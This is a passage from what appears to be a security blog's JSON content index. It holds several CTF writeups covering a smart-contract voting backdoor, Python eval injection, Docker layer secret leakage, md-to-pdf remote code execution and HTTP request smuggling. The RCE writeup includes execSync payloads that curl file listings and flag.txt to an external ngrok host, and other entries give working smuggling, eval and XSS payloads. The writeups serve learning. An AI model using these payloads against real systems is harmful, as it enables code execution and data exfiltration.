eth_getTransactionReceipt : the previous call returned the TX hash, used then to retrieve the TX receipt. In the TX receipt it\u0026rsquo;s given status: \u0026quot;0x0\u0026quot; because it failed. with eth_call it retrieves the revert reason and displays the message on the page. That\u0026rsquo;s exactly what the client is doing and we confirm that visualizing the Page Source:\nAdditional information we can extract here is that:\nThe contract function call is made with the function signature of publicVote(bytes3,bytes4,bytes3) which is a bit weird because we were made to choose only one parameter (bytes3 string of the selected party) and then padded to 200 bytes (8 bytes function signature + 64 bytes first param + 64 bytes second param + 64 bytes third param).\nContract calls are made via the RPC, fetching the /rpc endpoint with raw requests, despite having the web3.js library available, with which contracts calls are usually made. This unusual behavior, along with the comment linking the official ethereum guide for interacting with JSON-RPC endpoints, it\u0026rsquo;s a hint to explore JSON-RPC methods available for players facing this new scenario. Finding then that it\u0026rsquo;s possible to dump the bytecode compiled via the eth_getCode() method. Which clearly sounds useful, given that the smart contract code is not provided by the challenge.\nAnalysis # Dumping the bytecode # Understood that, let\u0026rsquo;s navigate to /connection endpoint and reset the challenge to have again the possibility to vote.\nCopy the new connection info and save them as bash variables. Take the Ethereum documentation example to call eth_getCode method and dump the compiled Solidity code in the blockchain.\n$ curl -X POST -H \u0026#34;Content-Type: application/json\u0026#34; --data \u0026#39;{\u0026#34;jsonrpc\u0026#34;:\u0026#34;2.0\u0026#34;,\u0026#34;method\u0026#34;:\u0026#34;eth_getCode\u0026#34;,\u0026#34;params\u0026#34;:[\u0026#34;\u0026#39;$TARGET_ADDRESS\u0026#39;\u0026#34;, \u0026#34;latest\u0026#34;],\u0026#34;id\u0026#34;:\u0026#34;1\u0026#34;}\u0026#39; $RPC_URL {\u0026#34;jsonrpc\u0026#34;:\u0026#34;2.0\u0026#34;,\u0026#34;id\u0026#34;:\u0026#34;1\u0026#34;,\u0026#34;result\u0026#34;:\u0026#34;0x608060405234801561000f575f80fd5b5060043610610060575f3560e01c80631ee7b2d7146100645780632a58bee11461008e57806386de6970146100c0578063aadd1d04146100d7578063b5b8f5bd146100ec578063f163fff91461010b575b5f80fd5b5f546100709060e81b81565b6040516001600160e81b031990911681526020015b60405180910390f35b6100b061009c3660046102d2565b60026020525f908152604090205460ff1681565b6040519015158152602001610085565b6100c960015481565b604051908152602001610085565b6100ea6100e536600461031b565b61011e565b005b6100c96100fa36600461031b565b60036020525f908152604090205481565b6100ea610119366004610334565b6101b9565b6001546001600160e81b031982165f90815260036020526040902054106101b6575f805462ffffff191660e883901c179055604080516001600160e81b0319831681526020810182905260118183015270776f6e2074686520456c656374696f6e7360781b606082015290517fba098fd59af30ed214753aea9c85711148ca596d1eda2b08605bab9bc5d22d86916080908290030190a15b50565b60015482148080156101ce57600183536101de565b335f908152600260205260408120555b5050335f9081526002602052604090205460ff16156102355760405162461bcd60e51b815260206004820152600e60248201526d416c726561647920766f7465642160901b60448201526064015b60405180910390fd5b6001600160e81b031983165f908152600360205260409020546102915760405162461bcd60e51b8152602060048201526014602482015273506172747920646f65736e27742065786973742160601b604482015260640161022c565b6001600160e81b031983165f908152600360209081526040808320805460e886901c01905533835260029091529020600190556102cd8361011e565b505050565b5f602082840312156102e2575f80fd5b81356001600160a01b03811681146102f8575f80fd5b9392505050565b80356001600160e81b031981168114610316575f80fd5b919050565b5f6020828403121561032b575f80fd5b6102f8826102ff565b5f805f60608486031215610346575f80fd5b61034f846102ff565b925060208401356001600160e01b03198116811461036b575f80fd5b9150610379604085016102ff565b9050925092509256fea264697066735822122027f852d100827d1fafc9891985e19bed9d0fc67a9d14ca60307b5392bab3d56564736f6c63430008140033\u0026#34;} Save it in env var.\n‚îî‚îÄ$ BYTECODE=$(curl -s -X POST -H \u0026#34;Content-Type: application/json\u0026#34; --data \u0026#39;{\u0026#34;jsonrpc\u0026#34;:\u0026#34;2.0\u0026#34;,\u0026#34;method\u0026#34;:\u0026#34;eth_getCode\u0026#34;,\u0026#34;params\u0026#34;:[\u0026#34;\u0026#39;$TARGET_ADDRESS\u0026#39;\u0026#34;, \u0026#34;latest\u0026#34;],\u0026#34;id\u0026#34;:\u0026#34;1\u0026#34;}\u0026#39; $RPC_URL | jq -r \u0026#39;.result\u0026#39;) ‚îî‚îÄ$ echo $BYTECODE 0x60806040... Reversing EVM bytecode # Now we have the compiled bytecode.\nWe can try to use a decompiler, which could give us inaccurate results but a good overview. Alternatively we can plot the Control Flow Graph (CFG) of the opcodes and analyze it to have a total and certain understanding of the smart contract flow, with the help of https://www.evm.codes if needed. (who needs contract code when we have bytecode? :)) Players will tend to go towards the first option, as it is more immediate and simple. So let\u0026rsquo;s look for the decompiler option first.\n1.1) Searching \u0026ldquo;solidity bytecode decompiler\u0026rdquo; or similar in google, mainly 2 decompilers will appear: ethervm Decompiler and Dedaub Decompiler. The second one is newer and actively maintained, will prompt more accurate results.\n// Compiled using the solidity compiler version 0.8.20 // Data structures and variables inferred from the use of storage instructions uint256 stor_0; // STORAGE[0x0] uint256 stor_1; // STORAGE[0x1] mapping (uint256 =\u0026gt; uint256) owner; // STORAGE[0x2] mapping (uint256 =\u0026gt; uint256) map_3; // STORAGE[0x3] function 0xf163fff9(bytes3 varg0, bytes4 varg1, bytes3 varg2) public payable { require(msg.data.length - 4 \u0026gt;= 96); require(varg0 == varg0); require(varg1 == varg1); require(varg2 == varg2); if (map_3[varg0]) { if (varg1 == stor_1) { owner[msg.sender] = 0; } else { MEM8[varg2] = 0x1 \u0026amp; 0xFF; } if (!uint8(owner[msg.sender])) { map_3[varg0] += varg2 \u0026gt;\u0026gt; 232; owner[msg.sender] = 1; if (map_3[varg0] \u0026gt;= stor_1) { stor_0 = varg0 \u0026gt;\u0026gt; 232 | bytes29(stor_0); emit 0xba098fd59af30ed214753aea9c85711148ca596d1eda2b08605bab9bc5d22d86(varg0, \u0026#39;won the Elections\u0026#39;); } exit; } } revert(Error(0x8c379a000000000000000000000000000000000000000000000000000000000, \u0026#34;Party doesn\u0026#39;t exist!\u0026#34;, \u0026#39;Already voted!\u0026#39;)); } function () public payable { revert(); } function 0x1ee7b2d7() public payable { return bytes3(stor_0 \u0026lt;\u0026lt; 232); } function 0x2a58bee1(address varg0) public payable { require(msg.data.length - 4 \u0026gt;= 32); require(varg0 == varg0); return bool(uint8(owner[varg0])); } function 0x86de6970() public payable { return stor_1; } function 0xaadd1d04(bytes3 varg0) public payable { require(msg.data.length - 4 \u0026gt;= 32); require(varg0 == varg0); if (map_3[varg0] \u0026gt;= stor_1) { stor_0 = varg0 \u0026gt;\u0026gt; 232 | bytes29(stor_0); emit 0xba098fd59af30ed214753aea9c85711148ca596d1eda2b08605bab9bc5d22d86(varg0, \u0026#39;won the Elections\u0026#39;); } } function 0xb5b8f5bd(bytes3 varg0) public payable { require(msg.data.length - 4 \u0026gt;= 32); require(varg0 == varg0); return map_3[varg0]; } // Note: The function selector is not present in the original solidity code. // However, we display it for the sake of completeness. function __function_selector__(bytes4 function_selector) public payable { MEM[64] = 128; require(!msg.value); if (msg.data.length \u0026gt;= 4) { if (0x1ee7b2d7 == function_selector \u0026gt;\u0026gt; 224) { 0x1ee7b2d7(); } else if (0x2a58bee1 == function_selector \u0026gt;\u0026gt; 224) { 0x2a58bee1(); } else if (0x86de6970 == function_selector \u0026gt;\u0026gt; 224) { 0x86de6970(); } else if (0xaadd1d04 == function_selector \u0026gt;\u0026gt; 224) { 0xaadd1d04(); } else if (0xb5b8f5bd == function_selector \u0026gt;\u0026gt; 224) { 0xb5b8f5bd(); } else if (0xf163fff9 == function_selector \u0026gt;\u0026gt; 224) { 0xf163fff9(); } } (); } This is the decompilation result. As expected, not very accurate but gives a good overview.\n0xf163fff9 function is publicVote(bytes3,bytes4,bytes3), let\u0026rsquo;s look closely: The first require statements are redundant. 1.2) Firstly checks that (map_3[varg0]) exits in the map3 mapping. If that doesn\u0026rsquo;t exists, it revert with error \u0026quot;Party doesn't exist!\u0026quot;. varg0 is _party choice, meaning that here it\u0026rsquo;s checking if we are voting a valid party. 1.3) Then, if party exists, it compares varg1 and stor_1. If they ARE NOT equal it take varg2 from memory and set to 1 (and mask it with 0xff). If they ARE equal, take msg.sender in the owner mapping (wrong naming) and set it to 0. 1.4) Just after that if owner[msg.sender] is set to true, it reverts with 'Already voted!'. 1.5) Otherwise continue the execution, update map_3[varg0] mapping adding varg2 and compare the result with stor_1 variable. If the result is greater than, it emits an event telling which party won the Elections.\nWhat does that mean? # Starting from the bottom, we need to reach the count of votes that is \u0026gt;= to stor_1 variable, in order to win the elections. To do that, we can update the mapping responsible to keep the count with a value we can control, which is varg2\u0026hellip; but only if varg1 and stor_1 values are equal, to avoid varg2 being set to 1 (otherwise we\u0026rsquo;ll need millions of votes) and to be able to vote multiple times bypassing the 'Already voted!' check.\nIn other words, we\u0026rsquo;re impliciting saying that the stor_1 is the magic value to trigger the backdoor and cast lots of votes in our favor!\n2.1) The same can be done analyzing the CFG (Control Flow Graph) of the contract if we get inaccurate results from the decompilation. That can be done using heimdall tool or many others, i.e:\n‚îî‚îÄ$ ./heimdall cfg -v -c bytecode.evm info: disassembled 899 bytes successfully. Looking at the top of the CFG we can see a classic function dispatcher/selector structure:\n2.2) The 0xf163fff9 function is the one we\u0026rsquo;re interested in because kekkak256 of publicVote(bytes3,bytes4,bytes3) is 0xf163fff96651.... Let\u0026rsquo;s look closely to search for SSTORE opcodes because we know that our vote is stored in a mapping:\nHere\u0026rsquo;s two. That\u0026rsquo;s what we\u0026rsquo;re looking for. These are the instructions that update the mapping that tracks whether an address has already voted or not. We\u0026rsquo;re sure on that because we can see CALLER and SHA3 opcodes. \\\n2.3) That\u0026rsquo;s the instructions that lets us vote multiple times:\nBecause it pushes 0x0 and store it in owner[msg.sender] mapping.\n2.4) And here\u0026rsquo;s the instructions that update the mapping that tracks the votes count with ADD:\nHow to reach that block? # 2.5) Going back a little bit it\u0026rsquo;s easy to see what\u0026rsquo;s the condition to trigger this blocks of instructions:\nHere the backdoor PUSH 0x1 and then do SLOAD, meaning that it\u0026rsquo;s loading the storage variable at index 1 (which is, the secret, 0xf00dbabe). Then it compares our input with that secret with EQ opcode which will return 0x1 if are equal (https://www.evm.codes/#14?fork=shanghai), and subsequently jumping in the code of interest (green arrow).\nSolution # Exploitation # First of all, we need to retrieve stor_1 value. That can be easily done with eth_getStorageAt JSON-RPC method:\n‚îî‚îÄ$ curl -X POST -H \u0026#34;Content-Type: application/json\u0026#34; --data \u0026#39;{\u0026#34;jsonrpc\u0026#34;:\u0026#34;2.0\u0026#34;,\u0026#34;method\u0026#34;:\u0026#34;eth_getStorageAt\u0026#34;,\u0026#34;params\u0026#34;:[\u0026#34;\u0026#39;$TARGET_ADDRESS\u0026#39;\u0026#34;, \u0026#34;0x0\u0026#34;, \u0026#34;latest\u0026#34;],\u0026#34;id\u0026#34;:1}\u0026#39; $RPC_URL {\u0026#34;jsonrpc\u0026#34;:\u0026#34;2.0\u0026#34;,\u0026#34;id\u0026#34;:1,\u0026#34;result\u0026#34;:\u0026#34;0x00000000000000000000000000000000000000000000000000f00dbabe000000\u0026#34;} reference to f00dbabe Hardware Wallet Hack\nthen, the vote count target:\n‚îî‚îÄ$ curl -X POST -H \u0026#34;Content-Type: application/json\u0026#34; --data \u0026#39;{\u0026#34;jsonrpc\u0026#34;:\u0026#34;2.0\u0026#34;,\u0026#34;method\u0026#34;:\u0026#34;eth_getStorageAt\u0026#34;,\u0026#34;params\u0026#34;:[\u0026#34;\u0026#39;$TARGET_ADDRESS\u0026#39;\u0026#34;, \u0026#34;0x1\u0026#34;, \u0026#34;latest\u0026#34;],\u0026#34;id\u0026#34;:1}\u0026#39; $RPC_URL {\u0026#34;jsonrpc\u0026#34;:\u0026#34;2.0\u0026#34;,\u0026#34;id\u0026#34;:1,\u0026#34;result\u0026#34;:\u0026#34;0x0000000000000000000000000000000000000000000000000000000008f0d180\u0026#34;} which is, 150000000. We can now add arbitrary votes with the only limit of being a bytes3. The maximum integer value representable by bytes3 is 0xffffff. Let\u0026rsquo;s calculate how many times we need to trigger the backdoor, knowing that UNZ party has already 8% votes:\n\u0026gt;\u0026gt;\u0026gt; ( 150_000_000 - (150_000_000 * 0.08) ) / 0xffffff 8.225441469278422 We need to trigger backdoor at least 9 times. We can do that, again, with the JSON-RPC (even intercepting and modifying requests with BurpSuite), or with cast send (the easier one).\n$ cast send $TARGET_ADDRESS \u0026#34;publicVote(bytes3,bytes4,bytes3)\u0026#34; \u0026#34;0x554e5a\u0026#34; \u0026#34;0xf00dbabe\u0026#34; \u0026#34;0xffffff\u0026#34; --rpc-url $RPC_URL --private-key $PRIVATE_KEY After 9 calls we can get the flag either by performing a request to the /flag API endpoint or by refreshing the page:\n","date":"10 July 2023","externalUrl":null,"permalink":"/posts/htb-businessctf-2023/2244_elections/","section":"Blog","summary":"Author writeup for the \u0026ldquo;2244 ELECTIONS\u0026rdquo; medium blockchain challenge from HTB Business CTF 2023.","title":"HTB Business CTF 2023 - 2244 ELECTIONS [Author Writeup]","type":"posts"},{"content":" Beginner ducks # Description: Hiiiii, welcome to ASIS CTF. We have ducks. Check them out http://ducks.asisctf.com:8000/. Download source-code from here.\nSource code:\n#!/usr/bin/env python3 from flask import Flask,request,Response import random import re app = Flask(__name__) availableDucks = [\u0026#39;duckInABag\u0026#39;,\u0026#39;duckLookingAtAHacker\u0026#39;,\u0026#39;duckWithAFreeHugsSign\u0026#39;] indexTemplate = None flag = None @app.route(\u0026#39;/duck\u0026#39;) def retDuck(): what = request.args.get(\u0026#39;what\u0026#39;) duckInABag = \u0026#39;./images/e146727ce27b9ed172e70d85b2da4736.jpeg\u0026#39; duckLookingAtAHacker = \u0026#39;./images/591233537c16718427dc3c23429de172.jpeg\u0026#39; duckWithAFreeHugsSign = \u0026#39;./images/25058ec9ffd96a8bcd4fcb28ef4ca72b.jpeg\u0026#39; if(not what or re.search(r\u0026#39;[^A-Za-z\\.]\u0026#39;,what)): return \u0026#39;what?\u0026#39; with open(eval(what),\u0026#39;rb\u0026#39;) as f: return Response(f.read(), mimetype=\u0026#39;image/jpeg\u0026#39;) @app.route(\u0026#34;/\u0026#34;) def index(): return indexTemplate.replace(\u0026#39;WHAT\u0026#39;,random.choice(availableDucks)) with open(\u0026#39;./index.html\u0026#39;) as f: indexTemplate = f.read() with open(\u0026#39;/flag.txt\u0026#39;) as f: flag = f.read() if(__name__ == \u0026#39;__main__\u0026#39;): app.run(port=8000) Our sink here is eval(), since it\u0026rsquo;ll execute the python code that we pass to the ?what parameter and return the result in the response. We can verify the vulnerability by running the code locally and passing to it the variable duckInABag, which evaluates to: './images/e146727ce27b9ed172e70d85b2da4736.jpeg', so code will be:\nwith open(\u0026#39;./images/e146727ce27b9ed172e70d85b2da4736.jpeg\u0026#39;,\u0026#39;rb\u0026#39;) as f: return Response(f.read(), mimetype=\u0026#39;image/jpeg\u0026#39;) and therefore show us the image.\nThere\u0026rsquo;s some input filtering with the regex: [^A-Za-z\\.]; it will only accept letters and the dot symbol. So how can we read /flag.txt if / isn\u0026rsquo;t allowed?\nWe can try to read the file descriptor properties. i.e: f.buffer.name will evaluate to: /flag.txt.\n$ curl http://ducks.asisctf.com:8000/duck?what=f.buffer.name ASIS{run-away-ducks-are-coming-ü¶Üü¶Ü} Flag: ASIS{run-away-ducks-are-coming-ü¶Üü¶Ü}\n","date":"15 October 2022","externalUrl":null,"permalink":"/posts/asis-quals-2022/beginner-ducks/","section":"Blog","summary":"Writeup for Beginner ducks reversing challenge of ASIS CTF Quals 2022.","title":"ASIS CTF Quals 2022 - Beginner ducks","type":"posts"},{"content":"","date":"15 October 2022","externalUrl":null,"permalink":"/tags/flask/","section":"Tags","summary":"","title":"Flask","type":"tags"},{"content":"","date":"15 October 2022","externalUrl":null,"permalink":"/tags/python/","section":"Tags","summary":"","title":"Python","type":"tags"},{"content":" DockREleakage # Description # A breach occurred and some files have been leaked. One of the leaked files named dockREleakage.tar.gz contains an image of one of the company\u0026rsquo;s components. An anonymous hacker has reached out to me and beware me that there is some serious mistake in my build image process. The hacker implies that sensitive information should be handled carefully. However, I couldn\u0026rsquo;t find the mistake by myself. Please help me!\nSolution # The challenge provides you dockREleakage.tar.gz, so pretty straight forward:\ntar xvf dockREleakage.tar --directory dockREleakage\ncd into folder and you\u0026rsquo;ll find different layers of a docker image. In the first json you\u0026rsquo;ll find the history of docker commands and in particular these two are useful for us:\n{ \u0026#34;created\u0026#34;: \u0026#34;2022-09-03T07:46:12.680399343Z\u0026#34;, \u0026#34;created_by\u0026#34;: \u0026#34;/bin/sh -c echo \\\u0026#34;ZmxhZ3tuM3Yzcl9sMzR2M181M241MTcxdjNfMW5mMHJtNDcxMG5fdW5wcjA=\\\u0026#34; \\u003e /dev/null\u0026#34;, \u0026#34;empty_layer\u0026#34;: true }, { \u0026#34;created\u0026#34;: \u0026#34;2022-09-03T07:46:13.319972067Z\u0026#34;, \u0026#34;created_by\u0026#34;: \u0026#34;/bin/sh -c cat p-flag.txt \\u003e tmp.txt; rm -rf flag.txt p-flag.txt; mv tmp.txt flag.txt; echo \\\u0026#34;\\\u0026#34; \\u003e\\u003e flag.txt\u0026#34; }, First command == first part of the flag, that is clearly a base64 encoded string:\n$ echo \u0026#34;ZmxhZ3tuM3Yzcl9sMzR2M181M241MTcxdjNfMW5mMHJtNDcxMG5fdW5wcjA=\u0026#34; | base64 -d flag{n3v3r_l34v3_53n5171v3_1nf0rm4710n_unpr0 Second command == second part of the flag, unsuccessful attempts to hide the flag as you can find them in the various layers inside the layer.tar\n$ cd 928ab519cd995aeae5eced3dbe4b7e86c8bc7f7662ef0f73e59c2f30b2b3b8e4 $ tree layer \u0026amp;\u0026amp; cat layer/chal/flag.txt layer ‚îî‚îÄ‚îÄ chal ‚îî‚îÄ‚îÄ flag.txt 73c73d_w17h1n_7h3_d0ck3rf1l3} Find the rest of the flag by yourself! Check out also this nice tool to explore docker image layers: https://github.com/wagoodman/dive Flag: flag{n3v3r_l34v3_53n5171v3_1nf0rm4710n_unpr073c73d_w17h1n_7h3_d0ck3rf1l3}\n","date":"14 September 2022","externalUrl":null,"permalink":"/posts/csaw-ctf-2022/dockreleakage/","section":"Blog","summary":"Writeup for DockREleakage reversing challenge of CSAW CTF 2022.","title":"CSAW CTF 2022 - DockREleakage","type":"posts"},{"content":" My Little Website # Description: I am new to programming and made this simple pdf creater website here, hopefully it is secure enough :) \u0026hellip; http://web.chal.csaw.io:5013\nThe challenge comes as a server-side PDF rendering website, and we can write markdown.\nFirst thing, let\u0026rsquo;s check for XSS:\n\u0026lt;script\u0026gt; document.write(window.location) \u0026lt;/script\u0026gt; And we find out that it\u0026rsquo;s vulnerable to Server-Side XSS, as we\u0026rsquo;re not injecting code in the webpage (client-side), instead we executing code on the server-side of the application.\nLet\u0026rsquo;s try something more interesting:\n\u0026lt;script\u0026gt;document.write(\u0026#39;\u0026lt;iframe src=\u0026#34;/\u0026#34;\u0026gt;\u0026lt;/iframe\u0026gt;\u0026#39;)\u0026lt;/script\u0026gt; We\u0026rsquo;re inside the /chal directory. We also understand that it\u0026rsquo;s a Node.js application, and index.js seems definitely something interesting for us, let\u0026rsquo;s try to read it:\n\u0026lt;script\u0026gt; fetch(\u0026#39;index.js\u0026#39;) .then(response =\u0026gt; response.text()) .then(text =\u0026gt; document.write(text)) \u0026lt;/script\u0026gt; That\u0026rsquo;s a lot of info, but what\u0026rsquo;s most important is the mdToPdf package. With a quick search we\u0026rsquo;ll know that the version used by the application is vulnerable to CVE-2021-23639 and we can achieve RCE: https://security.snyk.io/vuln/SNYK-JS-MDTOPDF-1657880.\n---js require(\u0026#39;child_process\u0026#39;).execSync(\u0026#39;ls -la \u0026gt; /tmp/ls.txt \u0026amp;\u0026amp; curl -d @/tmp/ls.txt http://06f6-151-62-28-161.eu.ngrok.io\u0026#39;) --- No flag here, let\u0026rsquo;s try to look one directory above:\n---js require(\u0026#39;child_process\u0026#39;).execSync(\u0026#39;ls -la .. \u0026gt; /tmp/ls.txt \u0026amp;\u0026amp; curl -d @/tmp/ls.txt http://06f6-151-62-28-161.eu.ngrok.io\u0026#39;) --- Here we go, read flag.txt:\n---js require(\u0026#39;child_process\u0026#39;).execSync(\u0026#39;curl -d @../flag.txt http://06f6-151-62-28-161.eu.ngrok.io\u0026#39;) --- Flag: CTF{pdf_c0nt1nu3s_70_5uCK}\n","date":"14 September 2022","externalUrl":null,"permalink":"/posts/csaw-ctf-2022/my-little-website/","section":"Blog","summary":"Writeup for My Little Website web challenge of CSAW CTF 2022.","title":"CSAW CTF 2022 - My Little Website","type":"posts"},{"content":"","date":"14 September 2022","externalUrl":null,"permalink":"/posts/csaw-ctf-2022/","section":"Blog","summary":"","title":"CSAW CTF 2022 writeups","type":"posts"},{"content":"","date":"14 September 2022","externalUrl":null,"permalink":"/tags/docker-layers/","section":"Tags","summary":"","title":"Docker Layers","type":"tags"},{"content":"","date":"14 September 2022","externalUrl":null,"permalink":"/categories/misc/","section":"Categories","summary":"","title":"Misc","type":"categories"},{"content":"","date":"14 September 2022","externalUrl":null,"permalink":"/tags/node.js/","section":"Tags","summary":"","title":"Node.js","type":"tags"},{"content":"","date":"8 September 2022","externalUrl":null,"permalink":"/tags/express.js/","section":"Tags","summary":"","title":"Express.js","type":"tags"},{"content":"","date":"8 September 2022","externalUrl":null,"permalink":"/tags/request-smuggling/","section":"Tags","summary":"","title":"Request Smuggling","type":"tags"},{"content":" TeamItaly CTF 2023 - Flag Proxy # Description: I just added authentication to my flag service (server-back) using a proxy (server-front), but a friend said it\u0026rsquo;s useless\u0026hellip;\nSite: http://flag-proxy.challs.teamitaly.eu\nAuthor: @Giotino\nThe challenge is based on a Node.js web application powered by Express.js. Two endpoints are provided:\n/flag: Returns the flag when accessed with a valid token. /add-token: Adds a token to the backend\u0026rsquo;s allowed list if the correct auth secret is provided. To retrieve the flag, the client must send a request to /flag with a query parameter ?token. This token is then passed as the Authorization header to the backend, and it must match one of the values in the tokens[] array. New tokens can be added via the /add-token endpoint by providing:\n?token: the token to add. ?auth: an authentication parameter. At first glance, the challenge appears secure. However, we see that in the frontend proxy server, http-client.js, on line 55-58 it blocks headers containing \\r\\n to prevent HTTP Request Smuggling. However, it fails to sanitize standalone \\n characters.\nThis allows smuggling requests via \\n line endings in the Authorization header. Moreover, the backend\u0026rsquo;s /add-token endpoint does not enforce the auth parameter check when accessed directly. Thus, smuggling a request to this endpoint allows adding arbitrary tokens without the secret.\nIt\u0026rsquo;s working! Now, lets smuggle another request to the /add-token endpoint with an arbitrary token, to be able to write our token inside tokens[] array, successfully bypassing frontend proxy server checks, and later getting the flag:\nimport requests url = \u0026#34;http://flag-proxy.challs.teamitaly.eu/flag\u0026#34; token = \u0026#34;httpsmugglingiscool\u0026#34; smuggle = f\u0026#34;SMUGGLE\\nContent-Length: 0\\nConnection: keep-alive\\n\\nGET /add-token?token={token} HTTP/1.0\u0026#34; req1 = requests.get(url, params={\u0026#34;token\u0026#34;: smuggle}) #print(req1.text) req2 = requests.get(url, params={\u0026#39;token\u0026#39;: token}) print(req2.json()[\u0026#39;body\u0026#39;]) Flag: flag{sanity_check}\n","date":"8 September 2022","externalUrl":null,"permalink":"/posts/teamitaly-ctf/flag-proxy/","section":"Blog","summary":"Writeup for Flag Proxy web challenge of TeamItaly CTF 2022","title":"TeamItaly CTF 2022 - Flag Proxy","type":"posts"},{"content":"","externalUrl":null,"permalink":"/about/","section":"","summary":"","title":"","type":"page"},{"content":"","externalUrl":null,"permalink":"/projects/","section":"","summary":"","title":"","type":"projects"}]